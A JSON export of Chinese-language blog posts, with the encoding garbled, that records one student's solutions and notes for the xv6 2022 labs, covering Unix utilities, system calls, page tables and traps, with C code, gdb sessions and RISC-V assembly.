{"posts":[{"title":"Lab1 Xv6 and Unix utilities","text":"å¼€å­¦ï¼ å¯åŠ¨ xv6git1234567891011121314151617git clone git://g.csail.mit.edu/xv6-labs-2022# æŸ¥çœ‹ git æ—¥å¿—git statusgit log# ç”¨äºè·å–å®éªŒæ‰€éœ€æ–‡ä»¶git checkout util# å½“å®Œæˆä¸€ä¸ªå®éªŒå¹¶æƒ³è¦æ£€è®°å½•è¿›åº¦å¯ä½¿ç”¨ git commitgit commit -am 'my solution for util lab exercise 1# æŸ¥çœ‹ç›¸æ¯”ä¸Šä¸€æ¬¡ commit çš„å˜åŒ–git diff# æŸ¥çœ‹ç›¸æ¯”æœ€åˆçš„å˜åŒ–git diff origin/util å»ºç«‹å¹¶è¿è¡Œ xv6 make qemu ç¬¬ä¸€æ­¥å°±å‡ºé”™äº†ã€‚ã€‚ã€‚ Error: Couldn't find a riscv64 version of GCC/binutils. ç¼ºå°‘ RISC-V ç›¸å…³çš„ GCC/binutils æœç´¢ binutils apt search binutils | grep riscv64 å®‰è£…ç¬¬ä¸€ä¸ªå³å¯ sudo apt install binutils-riscv64-linux-gnu æ¥ç€æ˜¯å¦ä¸€ä¸ªæŠ¥é”™ riscv64-linux-gnu-gcc -c -o kernel/entry.o kernel/entry.S make: riscv64-linux-gnu-gcc: No such file or directory make: *** [\\&lt;builtin\\&gt;: kernel/entry.o] Error 127 å®‰è£…å¯¹åº”çš„ gcc sudo apt install gcc-10-riscv64-linux-gnu è¿›å…¥ /usr/bin ç›®å½•ï¼Œå»ºç«‹è½¯é“¾æ¥ sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc åé¢åˆæ˜¯ç¼ºå°‘ä»€ä¹ˆæ–‡ä»¶ï¼Œå»ç¿»äº†ç¿» lab ä»‹ç»ï¼Œå‘ç°å·²ç»ç»™äº†å·¥å…·é“¾æ¥ lab tools page sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu è¿™é‡Œçš„ gcc-riscv64-linux-gnu ä¸‹è½½çš„æ˜¯ gcc-11ï¼Œè¦å†ä¸‹å› gcc-10ï¼Œä¸ç„¶ä¼šæŠ¥é”™ sudo apt install gcc-10-riscv64-linux-gnu cd /usr/bin; sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc ç»“æœä¸€æ°”å‘µæˆ~ é‡Œé¢æœ‰ä¸€äº›å¾ˆåŸºæœ¬çš„å‘½ä»¤ 12345678910111213141516171819202122232425262728xv6 kernel is bootinghart 1 startinghart 2 startinginit: starting sh$ ls. 1 1 1024.. 1 1 1024README 2 2 2227xargstest.sh 2 3 93cat 2 4 32832echo 2 5 31728forktest 2 6 15680grep 2 7 36176init 2 8 32152kill 2 9 31712ln 2 10 31520ls 2 11 34728mkdir 2 12 31784rm 2 13 31768sh 2 14 53960stressfs 2 15 32496usertests 2 16 181776grind 2 17 47696wc 2 18 33832zombie 2 19 31168console 3 20 0 -ç”šè‡³éƒ½æ²¡æœ‰ clear Ctrl-p æ‰“å°è¿›ç¨‹ä¿¡æ¯ Ctrl-a x é€€å‡º qemu ç»“è®ºï¼šåšä»»ä½•äº‹ä¹‹å‰å…ˆçœ‹ä»‹ç» æˆç»©æµ‹è¯•1234567# æµ‹è¯•æ‰€æœ‰å®éªŒmake grade# æµ‹è¯•ä¸€ä¸ªç¨‹åº./grade-lab-util name# æˆ–make GRADEFLAGS=name grade sleepåœ¨ bash ä¸­æµ‹è¯•ï¼Œèƒ½å¤Ÿå¤šå‚æ•°ä¸”å¦‚æœä¸€ä¸ªå‚æ•°é”™è¯¯å°±ä¸æ‰§è¡Œ user/sleep.c1234567891011121314151617181920212223242526272829303132#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int isDigitStr(char *str) { for(int i = 0; i &lt; strlen(str); ++i) { if(str[i] &lt; '0' || str[i] &gt; '9') { return 0; } } return 1;}int main(int argc, char *argv[]) { int status = 0; if(argc == 1) { printf(&quot;sleep: missing operand!\\n&quot;); status = -1; } for(int i = 1; i &lt; argc; ++i) { if(!isDigitStr(argv[i])) { printf(&quot;sleep: invalid time interval \\'%s\\'\\n&quot;, argv[i]); status = -1; } } for(int i = 1; i &lt; argc &amp;&amp; !status; ++i) { sleep(atoi(argv[i])); } exit(status);} æºä»£ç æ”¾åœ¨ user ç›®å½•ä¸‹ï¼Œæ¯æ¬¡å†™å®Œä¸€ä¸ªç¨‹åºåœ¨ Makefile ä¸­çš„ UPROGS ä¸‹æ·»åŠ ä¸€è¡Œ $U/_sleep\\ ç„¶å make qemu ç¼–è¯‘è¿è¡Œ ä¹‹åå¯ä»¥åœ¨ qemu å¤–è¿è¡Œ /grade-lab-util sleep è¿›è¡Œå•é¡¹æµ‹è¯• 12345$ ./grade-lab-util sleepmake: 'kernel/kernel' is up to date.== Test sleep, no arguments == sleep, no arguments: OK (1.5s)== Test sleep, returns == sleep, returns: OK (0.6s)== Test sleep, makes syscall == sleep, makes syscall: OK (1.0s) pingpongç®€å•é¢˜ çˆ¶è¿›ç¨‹å‘é€å­è¿›ç¨‹ä¸€ä¸ªå­—èŠ‚ï¼Œå­è¿›ç¨‹æ”¶åˆ°åå†ç»™çˆ¶è¿›ç¨‹ä¸€ä¸ªå­—èŠ‚ user/pingpong.c12345678910111213141516171819202122232425#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int main(int argc, char *argv[]) { int pid, p[2]; pipe(p); pid = fork(); if(pid == 0) { if(read(p[0], 0, 1)) { pid = getpid(); printf(&quot;%d: received ping\\n&quot;, pid); write(p[1], &quot;H&quot;, 1); exit(0); } } else { write(p[1], &quot;H&quot;, 1); if(read(p[0], 0, 1)) { pid = getpid(); printf(&quot;%d: received pong\\n&quot;, pid); exit(0); } } exit(-1);} primesæœ‰ç‚¹éš¾åº¦ æƒ³äº†å¥½ä¹…ï¼Œæ„Ÿè§‰æ˜¯è¦ç”¨é€’å½’ï¼Œä½†æ˜¯æ²¡æƒ³å‡ºæ¥æ€ä¹ˆå†™ æƒ³åˆ°åœ¨çœ‹ç½‘è¯¾çš„æ—¶å€™ï¼Œè¿›å…¥å­è¿›ç¨‹å…ˆæŠŠ close(0)ï¼Œç„¶å dup(p[1])ï¼Œä¹Ÿå°±æ˜¯æŠŠå­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥æ”¹ä¸ºç®¡é“çš„è¾“å…¥äº†ï¼Œè¿™æ ·å°±å®¹æ˜“å†™é€’å½’äº† å½“ä»è¾“å…¥æ¥æ”¶ä¸åˆ° prime çš„æ—¶å€™ exit(0) è¿™é‡Œæ³¨æ„ dup(p[1]) åè¦æŠŠç®¡é“éƒ½ç»™å…³äº† user/primes.c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;void printPrime(int prime) { printf(&quot;prime %d\\n&quot;, prime);}void primes() { int prime, n, pid, p[2]; if(!read(0, &amp;prime, sizeof(prime))) { exit(0); } printf(&quot;prime %d\\n&quot;, prime); pipe(p); pid = fork(); if(pid == 0) { close(0); dup(p[0]); close(p[0]); close(p[1]); primes(); exit(0); } else { while(read(0, &amp;n, sizeof(n))) { write(p[1], &amp;n, 4); } close(p[1]); int status; wait(&amp;status); exit(0); } exit(-1);}int main(int argc, char *argv[]) { int pid, p[2]; pipe(p); pid = fork(); if(pid == 0) { close(0); dup(p[0]); close(p[0]); close(p[1]); primes(); exit(0); } else { for(int i = 2; i &lt; 36; ++i) { write(p[1], &amp;i, 4); } close(p[1]); int status; wait(&amp;status); exit(0); } exit(-1);} findåŒæ ·ä¹Ÿæ˜¯é€’å½’ï¼Œä»ç›®å½•é‡ŒæŸ¥æ‰¾æ–‡ä»¶å¯ä»¥å‚è€ƒ ./user/ls.c å½“æ‰¾çš„æ˜¯æ–‡ä»¶æˆ–è€…æ—¶æ¯”è¾ƒåå­— å½“æ‰¾çš„æ˜¯ç›®å½•æ—¶ï¼Œä» fd è¯»å– struct dirent[]ï¼Œè¡¨ç¤ºç›®å½•ä¸‹çš„æ¯ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ nameï¼Œè¡¨ç¤ºæ–‡ä»¶åï¼Œæ³¨æ„è¿‡æ»¤ . å’Œ .. user/find.c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &quot;kernel/types.h&quot;#include &quot;kernel/fcntl.h&quot;#include &quot;kernel/stat.h&quot;#include &quot;kernel/fs.h&quot;#include &quot;user/user.h&quot;void find(char *path, char *filename) { char buf[512]; char *name, *p; int fd; struct stat st; struct dirent de; if((fd = open(path, O_RDONLY)) &lt; 0) { printf(&quot;find: cannot open %s\\n&quot;, path); return; } if(fstat(fd, &amp;st) &lt; 0) { printf(&quot;find: cannot stat %s\\n&quot;, path); return; } switch(st.type) { case T_DEVICE: case T_FILE: name = path; for (int i = strlen(path)-1; i &gt;= 0; --i) { if(path[i] == '/') { name = &amp;path[i+1]; break; } } if(!strcmp(name, filename)) { printf(&quot;%s\\n&quot;, path); } break; case T_DIR: if(strlen(path) + 1 + DIRSIZ + 1 &gt; sizeof(buf)) { printf(&quot;find: path too long\\n&quot;); break; } strcpy(buf, path); p = buf + strlen(buf); *p++ = '/'; while(read(fd, &amp;de, sizeof(de)) == sizeof(de)) { if(de.inum == 0 || !strcmp(de.name, &quot;.&quot;) || !strcmp(de.name, &quot;..&quot;)) { continue; } memmove(p, de.name, DIRSIZ); p[DIRSIZ] = 0; // printf(&quot;finding: %s\\n&quot;, buf, DIRSIZ); find(buf, filename); } break; } close(fd);}int main(int argc, char *argv[]) { if(argc != 3) { printf(&quot;find: invalid argument\\n&quot;); exit(-1); } find(argv[1], argv[2]); exit(0);} xargsä¸€å¼€å§‹æ²¡æ‡‚ sh æ€ä¹ˆå®ç°ç®¡é“ æµ‹è¯•å‘ç°å°±æ˜¯å°†ç®¡é“çš„è¯»ç«¯ä½œä¸º | å³è¾¹ç¨‹åºçš„æ ‡å‡†è¾“å…¥ ä¸»è¦æ˜¯åˆ¤æ–­ä»€ä¹ˆæ—¶å€™è·³å‡ºå¾ªç¯ user/xargs.c12345678910111213141516171819202122232425262728293031323334353637#include &quot;kernel/types.h&quot;#include &quot;kernel/param.h&quot;#include &quot;user/user.h&quot;int main(int argc, char *argv[]) { int idx = 0, pid; int status; char buf; char *new_argv[argc+1]; for(int i = 1; i &lt; argc; ++i) { new_argv[i-1] = argv[i]; } while(read(0, &amp;buf, 1)) { idx = 0; new_argv[argc-1] = (char*)malloc(MAXARG); do { if(buf == '\\n') { new_argv[argc-1][idx] = '\\0'; new_argv[argc] = 0; break; } new_argv[argc-1][idx++] = buf; } while(read(0, &amp;buf, 1)); pid = fork(); if(pid == 0) { exec(new_argv[0], new_argv); printf(&quot;wrong command\\n&quot;); exit(-1); } else { wait(&amp;status); } } exit(0);} Optional challenge exerciseså†™ä¸€ä¸ª uptime ç¨‹åºæ¥è°ƒç”¨ uptime ç³»ç»Ÿè°ƒç”¨ç›´æ¥è°ƒç”¨ uptime ç„¶åæ‰“å°è¿”å›å€¼å°±å¥½äº† å¯¹ grep å®ç°æ­£åˆ™åŒ¹é…yysyï¼Œå¯¹æ­£åˆ™è¡¨è¾¾å¼ä¸æ˜¯å¾ˆäº†è§£ æ”¹é€  sh#todo","link":"/2022/10/13/Lab1_Xv6_and_Unix_utilities/"},{"title":"Lab2 System Calls","text":"å¼€å­¦ï¼ å®éªŒå¼€å§‹å‰123git fetchgit checkout syscallmake clean ä½¿ç”¨ gdb å“ªä¸ªå‡½æ•°è°ƒç”¨äº† syscall usertrap() åœ¨ syscall è®¾ç½®æ–­ç‚¹åï¼Œè¾“å…¥ backtrace æŸ¥çœ‹æ ˆå›æº¯ p-&gt;trapframe-&gt;a7 çš„å€¼æ˜¯å¤šå°‘ï¼Œå€¼ä»£è¡¨ä»€ä¹ˆï¼Ÿ 7ï¼Œä»£è¡¨ç³»ç»Ÿè°ƒç”¨å· SYS_exec è¿è¡Œåˆ° num = p-&gt;trapframe-&gt;a7ï¼Œè¾“å…¥ p num CPU çš„ä¸Šä¸€ä¸ªæ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ ç»™çš„æ–‡æ¡£çœ‹ä¸æ‡‚ã€‚ã€‚ æ›´æ–°ï¼šsstatus çš„ SSP ä½è¡¨ç¤º trap æ¥è‡ªå“ªä¸€ä½ ä»¤ num = * (int *) 0;ï¼Œkernel åœ¨å“ªæ¡æ±‡ç¼–æŒ‡ä»¤ panicï¼Œå“ªä¸ªå¯„å­˜å™¨å¯¹åº”å˜é‡ num lw a3, 8(zero)ï¼Œa2ï¼ˆï¼Ÿï¼‰ å¤šæ¬¡æ›´æ”¹ num å€¼æ¥è°ƒè¯• ä¸ºä»€ä¹ˆå†…æ ¸å´©æºƒäº†ï¼Ÿåœ¨å†…æ ¸åœ°å€ç©ºé—´ 0 åœ°å€æœ‰æ˜ å°„å—ï¼Ÿä¸Šé¢çš„ scause å€¼æ˜¯å¦è¯å®è¿™ä¸€ç‚¹ï¼Ÿ å› ä¸ºå°è¯•è®¿é—® 0 åœ°å€ï¼Œæ²¡æœ‰æœ‰æ•ˆæ˜ å°„ å½“å†…æ ¸ panic æ—¶è¿›ç¨‹çš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿè¿›ç¨‹ pid æ˜¯å¤šå°‘ï¼Ÿ â€œinitcodeâ€ï¼Œ1 æœ‰ç‚¹è¿‡äºå¤æ‚ï¼Œæ²¡èƒ½ç†è§£ è®¿é—®åˆ° 0 åœ°å€æ—¶ä¸ºä»€ä¹ˆä¼šè·³è½¬åˆ° kernelvec ä¸­ scauseã€sepcã€stval çš„å«ä¹‰ æ›´æ–°ï¼šè®¿é—® 0 å‘ç”Ÿäº† trapï¼Œè·³è½¬åˆ°å†…æ ¸ä¸­å¤„ç†å†…æ ¸ trap çš„ä½ç½®ï¼›scause æè¿° trapï¼Œsepc ä¿å­˜å‘ç”Ÿ trap æ—¶ pc çš„å€¼ï¼Œstval ä¿å­˜ trap çš„å€¼ System call tracingåœ¨ user/trace.c å·²ç»å†™å¥½äº†ç¨‹åºï¼Œåªéœ€è¦å®ç°ç³»ç»Ÿè°ƒç”¨å³å¯ å…ˆåœ¨ user/user.h åŠ ä¸ŠåŸå‹ï¼Œåœ¨ user/usys.pl åŠ ä¸Š stub ï¼ˆå­˜æ ¹ï¼‰ï¼Œåœ¨ kernel/syscall.h åŠ ä¸Šç³»ç»Ÿè°ƒç”¨å· åœ¨ kernel.c çš„ proc ç»“æ„ä½“åŠ ä¸Šä¸€ä¸ªæ–°å˜é‡ tracemask åœ¨ kernel/sysproc.c åŠ ä¸Š sys_traceï¼Œè®¾ç½®å½“å‰è¿›ç¨‹çš„ trackmask kernel/sysproc.c123456789uint64sys_trace(int){ int mask; argint(0, &amp;mask); myproc()-&gt;tracemask = mask; return 0;} ä¿®æ”¹ kernel/proc.c çš„ fork å‡½æ•°ï¼Œå°†çˆ¶è¿›ç¨‹çš„ tracemask ä¼ ç»™å­è¿›ç¨‹ kernel/proc.c1np-&gt;tracemask = p-&gt;tracemask; ä¿®æ”¹ kernel/syscall.c çš„ syscall å‡½æ•°ï¼Œå¦‚æœæ˜¯ tracemask å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå°±æ‰“åº”å‡ºæ¥ï¼ˆé‡Œé¢è¿˜è¦æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ syscallNamesï¼‰ kernel/syscall.c123if(1&lt;&lt;num &amp; p-&gt;tracemask) { printf(&quot;%d: syscall %s -&gt; %d\\n&quot;, p-&gt;pid, syscallNames[num], p-&gt;trapframe-&gt;a0);} ä¸€ä¸ªå¾ˆç®€å•çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»…ä»…æ˜¯è·å–ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼Œç„¶åå°†å‚æ•°ä¼ ç»™ proc-&gt;tracemaskï¼Œå°±å¯ä»¥å®ç°ï¼Œä½†æ˜¯èƒ½å­¦åˆ°å¾ˆå¤šç»†èŠ‚ Sysinfoè¿™é‡Œæˆ‘ä»¬è¦ä½¿ç”¨ copyoutï¼Œå› ä¸ºç³»ç»Ÿè°ƒç”¨å‡½æ•°ä½å¤„äºå†…æ ¸æ¨¡å¼ï¼Œéœ€è¦è¿›ç¨‹çš„é¡µè¡¨å’Œè™šæ‹Ÿåœ°å€æ¥æŸ¥æ‰¾ç”¨æˆ·è¿›ç¨‹ä¸­å˜é‡çš„ç‰©ç†ä½ç½®ï¼ˆæ¯”å¦‚ sysinfo ç»“æ„ä½“ï¼‰ï¼Œç„¶åå°†å†…æ ¸çš„æ•°æ®å¤åˆ¶ç»™ç”¨æˆ·è¿›ç¨‹ kernel/sysproc.c1234567891011121314151617uint64sys_sysinfo(void){ uint64 si; struct sysinfo info; argaddr(0, &amp;si); if(!si) { return -1; } info.freemem = get_freemem(); info.nproc = get_nproc(); if(copyout(myproc()-&gt;pagetable, si, (char*)&amp;info, sizeof(info)) &lt; 0) { return -1; } return 0;} å†™ get_freemem æ—¶ï¼Œè§‚å¯Ÿ kalloc å‡½æ•°ï¼Œç›´æ¥ä» kmem.freelist å–ä¸€é¡µå†…å­˜è¿”å›ï¼Œå¯ä»¥æ¨æµ‹ kmem.freelist åŒ…å«æ‰€æœ‰å¯ç”¨çš„å†…å­˜ kernel/kalloc.c1234567891011uint64get_freemem(void){ struct run *r; uint64 n = 0; for(r = kmem.freelist; r; r = r-&gt;next) { n += 4096; } return n;} å†™ ger_nproc æ—¶ï¼Œè§‚å¯Ÿ procinit å‡½æ•°ï¼Œåœ¨ proc[NPROC] æ•°æ®ä¸­éå†åˆå§‹åŒ–ï¼Œä¸”å…¶ä¸­å« state å˜é‡ kernel/proc.c123456789101112uint64get_nproc(void){ struct proc *p; uint64 nproc = 0; for(p = proc; p &lt; &amp;proc[NPROC]; p++) { if(p-&gt;state != UNUSED) { nproc++; } } return nproc;} è®°å¾—åœ¨ sysproc.c å¼•å…¥ sysinfo.hï¼Œåœ¨ defs.h åŠ ä¸Š get_freemem å’Œ get_nproc Optional challenge exercisesè°ƒç”¨ trace æ—¶æ‰“å°å‡ºç³»ç»Ÿè°ƒç”¨çš„å‚æ•°è®°å½•æ¯ä¸ªç³»ç»Ÿè°ƒç”¨å‚æ•°ä¸ªæ•°ç„¶åæ‰“å°å‡ºæ¥å°±å¥½äº† è®¡ç®—è´Ÿè½½å¹³å‡å€¼å¹¶é€šè¿‡ sysinfo å¯¼å‡ºä¸æ˜¯å¾ˆæ‡‚","link":"/2022/10/20/Lab2_system_calls/"},{"title":"Lab3 Page Tables","text":"å¼€å­¦ï¼ git123git fetchgit checkout pgtblmake clean Speed up system callsä¸ºäº†ä¼˜åŒ– getpid ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ç”¨æ¯æ¬¡è¿›å…¥å†…æ ¸æ€è·å– PIDï¼Œåˆ›å»ºä¸€ä¸ªç”¨æˆ·å¯è¯»çš„é¡µï¼Œå°† USYSCALL æ˜ å°„åˆ°è¯¥é¡µä¸Šï¼Œåœ¨è°ƒç”¨ ugetpid æ—¶ï¼Œç›´æ¥è®¿é—® USYSCALL å³å¯æ‹¿åˆ° pidï¼Œä¸éœ€è¦ç³»ç»Ÿè°ƒç”¨ï¼Œç®—æ˜¯ä»¥ç©ºé—´æ¢æ—¶é—´ è¿™é‡Œä¸åŒçš„æ˜¯ï¼Œé¡µè¡¨æ˜ å°„å®é™…ä¸Šæ˜¯è™šæ‹Ÿåœ°å€æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€ï¼Œè€Œä¸æ˜¯æ˜ å°„åˆ°ç‰©ç†åœ°å€ åœ¨ kernel/proc.h ä¸­ proc ç»“æ„ä½“åŠ å…¥ struct usyscall *usyscall åœ¨ allocproc åˆå§‹åŒ– usyscall kernel/proc.c12345678910111213static struct proc* allocproc(void){ ... if((p-&gt;usyscall = (struct usyscall *)kalloc()) == 0){ freeproc(p); release(&amp;p-&gt;lock); return 0; } p-&gt;usyscall-&gt;pid = p-&gt;pid; ...} åœ¨ proc_pagetable å»ºç«‹æ˜ å°„ kernel/proc.c1234567891011121314pagetable_t proc_pagetable(struct proc *p){ ... if(mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; 0){ uvmunmap(pagetable, TRAMPOLINE, 1, 0); uvmunmap(pagetable, TRAPFRAME, 1, 0); uvmfree(pagetable, 0); return 0; } ...} åœ¨ freeproc é‡Šæ”¾ usyscall kernel/proc.c12345678910static void freeproc(struct proc *p){ ... if(p-&gt;usyscall) kfree((void*)p-&gt;usyscall); p-&gt;usyscall = 0; ...} Print a page tablexv6 ä½¿ç”¨ä¸‰çº§é¡µè¡¨ï¼Œåœ¨è¿è¡Œç¬¬ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹æ—¶æ‰“å°å‡ºå…¶é¡µè¡¨ è¿™é‡Œä½¿ç”¨ä¸€ä¸ªé™æ€å˜é‡ level è¡¨ç¤ºåœ¨ç¬¬å‡ çº§é¡µè¡¨ kernel/vm.c12345678910111213141516171819202122232425void vmprint(pagetable_t pagetable) { static int level = 0; if(level == 0) { level++; printf(&quot;page table %p\\n&quot;, pagetable); } for(int i = 0; i &lt; 512 &amp;&amp; level &lt;= 3; ++i) { pte_t pte = pagetable[i]; if(pte &amp; PTE_V) { for(int j = 0; j &lt; level; ++j) { printf(&quot; ..&quot;); } printf(&quot;%d: pte %p pa %p\\n&quot;, i, pte, PTE2PA(pte)); level++; vmprint((pagetable_t)PTE2PA(pte)); level--; } } if(level == 1) { level--; }} çœ‹åˆ° wingsgg ç”¨ pte &amp; (PTE_R|PTE_W|PTE_X) == 0 è¡¨ç¤ºæ˜¯å¦ä¸­é—´é¡µè¡¨ï¼Œç¡®å®å¾ˆæ£’ï¼Œä½†æ˜¯ç”¨äº†ä¸¤ä¸ªå‡½æ•° ç¬”è€…å·²ç»ç”¨ä¸€ä¸ªå‡½æ•°å†™å¥½äº†ï¼Œè§‰å¾—ä¹Ÿè¿˜è¡Œ ç„¶ååœ¨ exec.c å’Œ defs.h ä¸­æ·»åŠ å£°æ˜å’Œä½¿ç”¨å°±è¡Œ Detect which pages have been accessedRISC-V ç¡¬ä»¶ä¼šåœ¨ TLB å‘½ä¸­å¤±è´¥æ—¶ï¼Œå°†å¯¹åº” PTE çš„ Access æ ‡å¿—ä½è®¾ 1ï¼Œç”¨æ¥è®°å½•è¯¥é¡µé¢æœ‰æ²¡æœ‰è®¿é—®è¿‡ å†™ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¸‰ä¸ªå‚æ•°ï¼Œæ£€æµ‹çš„è™šæ‹Ÿåœ°å€ï¼Œæ£€æµ‹çš„é¡µæ•°ï¼Œbitmask æŒºç®€å•çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå®éªŒéš¾åº¦å†™ç€ hard 123456789101112131415161718192021222324252627282930#define PTE_A (1L &lt;&lt; 6)intsys_pgaccess(void){ uint64 buf; int n; uint64 uabits; argaddr(0, &amp;buf); argint(1, &amp;n); argaddr(2, &amp;uabits); uint abits = 0; pagetable_t pagetable = myproc()-&gt;pagetable; for(int i = 0; i &lt; n; ++i) { pte_t *pte; pte = walk(pagetable, buf + i * PGSIZE, 0); if(!pte) { return -1; } if(*pte &amp; PTE_A) { abits |= 1 &lt;&lt; i; *pte &amp;= ~PTE_A; } } copyout(pagetable, uabits, (char*)&amp;abits, sizeof(abits)); return 0;} æ³¨æ„æ£€æµ‹å®Œåï¼Œå°†æ ‡è®°ç½®é›¶ï¼Œä¸ç„¶ä¸çŸ¥é“æ£€æµ‹åè¿˜æ²¡æœ‰è®¿é—®è¿‡ Optional challenge exercisesä½¿ç”¨ super-pages å‡å°‘é¡µè¡¨ä¸­ PTE çš„æ•°é‡ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ”¹ç”¨æ›´å¤§çš„é¡µï¼ˆï¼Ÿï¼‰ å–æ¶ˆç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€é¡µçš„æ˜ å°„ï¼Œè¿™æ ·å¯ä»¥ä½¿å¼•ç”¨ç©ºæŒ‡é’ˆç›´æ¥é€ æˆé”™è¯¯ éœ€è¦ä¿®æ”¹ user.ld æ–‡ä»¶ï¼Œè®©è¿›ç¨‹çš„ text æ®µä» 0x1000 å¼€å§‹ï¼Œè€Œä¸æ˜¯ 0 ä¼°è®¡è¦æ”¹å¾ˆå¤šä¸œè¥¿ï¼ˆuvmmapï¼Œuvmallocå•¥çš„ï¼‰ã€‚ã€‚ã€‚å’•å’•å’• æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æŠ¥å‘Š dirty pagesï¼ˆä¿®æ”¹è¿‡çš„é¡µè¡¨ï¼‰å’Œç¬¬ä¸‰ä¸ªå·®ä¸å¤šï¼Œå°±ä¸åšäº†","link":"/2022/10/23/Lab3_Page_tables/"},{"title":"Lab4 Traps","text":"å¼€å­¦ï¼ RISC-V assemblyuser/call.c123456789101112int g(int x) { return x+3;}int f(int x) { return g(x);}void main(void) { printf(&quot;%d %d\\n&quot;, f(8)+1, 13); exit(0);} é˜…è¯» user/call.asm å›ç­”é—®é¢˜~ main.asm12345678910111213141516171819000000000000001c &lt;main&gt;:void main(void) { 1c: 1141 addi sp,sp,-16 1e: e406 sd ra,8(sp) 20: e022 sd s0,0(sp) 22: 0800 addi s0,sp,16 printf(&quot;%d %d\\n&quot;, f(8)+1, 13); 24: 4635 li a2,13 26: 45b1 li a1,12 28: 00000517 auipc a0,0x0 2c: 7c850513 addi a0,a0,1992 # 7f0 &lt;malloc+0xee&gt; 30: 00000097 auipc ra,0x0 34: 614080e7 jalr 1556(ra) # 644 &lt;printf&gt; exit(0); 38: 4501 li a0,0 3a: 00000097 auipc ra,0x0 3e: 290080e7 jalr 656(ra) # 2ca &lt;exit&gt;} ä¼ ç»™å‡½æ•°çš„å‚æ•°ä¿å­˜åœ¨å“ªäº›å¯„å­˜å™¨ä¸­ï¼Ÿä¾‹å¦‚ main å‡½æ•°ä¸­çš„è°ƒç”¨ printf çš„å‚æ•° 13 ä¿å­˜åœ¨å“ªä¸ªå¯„å­˜å™¨ä¸­ï¼Ÿ a0 ~ a7 ä¿å­˜å‡½æ•°å‚æ•°ï¼Œæ›´å¤šçš„å‚æ•°æ”¾åœ¨æ ˆä¸­ main è°ƒç”¨ printf çš„å‚æ•° 13 åœ¨ a2 ä¸­ main å‡½æ•°ä¸­è°ƒç”¨ f å‡½æ•°çš„æ±‡ç¼–ä»£ç åœ¨å“ªï¼Ÿè°ƒç”¨ g å‡½æ•°çš„ä»£ç åœ¨å“ªï¼Ÿï¼ˆæç¤ºï¼šç¼–è¯‘å™¨å¯èƒ½å†…è”å‡½æ•°ï¼‰ çœŸçš„æœ‰è°ƒç”¨å—ã€‚ã€‚ã€‚æ„Ÿè§‰ç¼–è¯‘å™¨ä¼˜åŒ–äº†ï¼Œç›´æ¥æŠŠ f(8)+1 çš„ç»“æœè®¡ç®—å‡ºæ¥ä¸º 12ï¼Œä¼ ç»™ a1 å¯„å­˜å™¨äº†ã€‚ printf å‡½æ•°çš„åœ°å€æ˜¯å¤šå°‘ï¼Ÿ çœ‹æ³¨é‡Šï¼Œåœ¨ 0x644 åœ¨ main å‡½æ•°ä¸­ï¼Œåœ¨æ‰§è¡Œ jalr è·³è½¬åˆ° printf åï¼Œra å¯„å­˜å™¨çš„å€¼æ—¶å¤šå°‘ï¼Ÿ 0x38 jalr ä¼šå°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å­˜åˆ°æ‹¬å·ä¸­çš„å¯„å­˜å™¨ä¸­ è¿è¡Œä¸‹é¢çš„ä»£ç ï¼Œè¾“å‡ºä»€ä¹ˆï¼Ÿunsigned int i = 0x00646c72;printf(â€œH%xâ€ Wo%sâ€, 57616, &amp;i); He110 World ä¸‹é¢çš„ä»£ç ï¼Œä¼šæ‰“å°å‡º â€˜y=â€™ ä»€ä¹ˆï¼Ÿprintf(â€œx=%d y=%dâ€, 3); æŒ‰ç…§ RISC-V çš„å‡½æ•°è°ƒç”¨çº¦å®šï¼Œä¼šæ‰“å°å‡º a2 å¯„å­˜å™¨çš„å€¼ Backtraceå¯¹å†…æ ¸çš„å‡½æ•°è°ƒç”¨è¿›è¡Œå›æº¯ï¼Œæ¯”è¾ƒç®€å• æ ¹æ® RISC-V çš„å‡½æ•°è°ƒç”¨çº¦å®šï¼Œra ä½äº fp - 0x8 çš„ä½ç½®ï¼ŒPrev.fp ä½äº fp - 0x10 çš„ä½ç½® åœ¨å†…æ ¸æ ˆä¸­ï¼Œæœ€åä¸€ä¸ªæ ˆå¸§æŒ‡é’ˆä½äºé¡µé¢çš„é¦–åœ°å€ï¼Œæ ¹æ®è¿™ä¸ªå¯ä»¥åˆ¤æ–­ä½•æ—¶é€€å‡ºå¾ªç¯ å¯ä»¥é€šè¿‡ gdb è¿›è¡Œè°ƒè¯•ï¼Œ0x3ffffff9fc0 -&gt; 0x3ffffffe0 -&gt; 0x3ffffffa000 1234567891011(gdb) x/20gx $fp-0x100x3fffff9f70: 0x0000003fffff9fc0 0x00000000800021aa0x3fffff9f80: 0x0000003fffff9fc0 0x00000001ffff9fa00x3fffff9f90: 0x0000003fffff9fc0 0x00000000000000200x3fffff9fa0: 0x0000000087f70000 0x00000000800090300x3fffff9fb0: 0x0000003fffff9fe0 0x000000008000201c0x3fffff9fc0: 0x0000000000000063 